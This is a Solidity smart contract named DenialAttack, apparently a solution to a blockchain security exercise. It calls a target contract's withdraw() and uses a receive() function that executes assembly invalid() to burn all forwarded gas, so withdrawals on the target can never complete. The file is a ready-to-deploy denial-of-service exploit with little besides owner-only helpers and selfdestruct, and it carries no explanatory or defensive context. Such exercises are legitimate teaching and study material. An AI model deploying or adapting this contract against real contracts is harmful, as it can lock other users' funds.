// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial   {
    function withdraw() external;
}   
contract DenialAttack {

    address payable public owner;
    IDenial public denial;
    // Event triggered when owner withdraws ETH from the contract
    event Withdrawal(address indexed owner, uint256 amount);

    constructor(address target) {
        owner = payable(msg.sender);
        denial = IDenial(target);
    }

    // Modifier that restricts access to certain functions to the owner of the contract
    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    // Function that allows the owner to withdraw ETH from the contract
    function withdraw(uint256 amount) external onlyOwner {
        require(amount > 0, "Withdraw amount must be greater than zero.");
        require(address(this).balance >= amount, "Insufficient balance.");
        (bool success, ) = owner.call{value: amount}("");
        require(success, "Withdrawal failed.");
        emit Withdrawal(owner, amount);
    }

    function attack() payable external onlyOwner {
        denial.withdraw();
    }


    // Function that accepts incoming ETH
    receive() external payable {
        assembly {
            invalid()
        }
    }

    // Function that allows the current owner to transfer ownership to a new address
    function changeOwner(address payable newOwner) external onlyOwner {
        require(newOwner != address(0), "New owner address cannot be zero.");
        owner = newOwner;
    }

    // Function that allows the owner to destroy the contract and transfer any remaining ETH to their address
    function destroy() external onlyOwner {
        selfdestruct(owner);
    }
    
}